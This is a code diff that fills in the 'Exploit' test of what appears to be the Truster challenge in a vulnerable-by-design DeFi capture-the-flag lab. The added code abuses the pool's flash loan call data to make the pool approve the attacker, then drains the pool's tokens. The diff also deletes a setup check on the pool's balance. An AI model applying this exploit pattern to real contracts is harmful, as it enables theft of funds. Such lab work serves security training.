@@ -19,16 +19,24 @@ describe('[Challenge] Truster', function () {
         await this.token.transfer(this.pool.address, TOKENS_IN_POOL);
 
         expect(
-            await this.token.balanceOf(this.pool.address)
-        ).to.equal(TOKENS_IN_POOL);
-
-        expect(
             await this.token.balanceOf(attacker.address)
         ).to.equal('0');
     });
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+
+        // generating function call data for token approve function call using ethers Interface
+        let ABI = [ "function approve(address spender, uint256 amount) external returns (bool)" ];
+        let iface = new ethers.utils.Interface(ABI);
+        let data = iface.encodeFunctionData("approve", [attacker.address,TOKENS_IN_POOL]);
+
+        // calling flashLoan function 
+        await this.pool.flashLoan(TOKENS_IN_POOL,this.pool.address,this.token.address,data);
+
+        // transfering the approved coins from pool to attacker
+        await this.token.connect(attacker).transferFrom(this.pool.address,attacker.address,TOKENS_IN_POOL);
+
     });
 
     after(async function () {
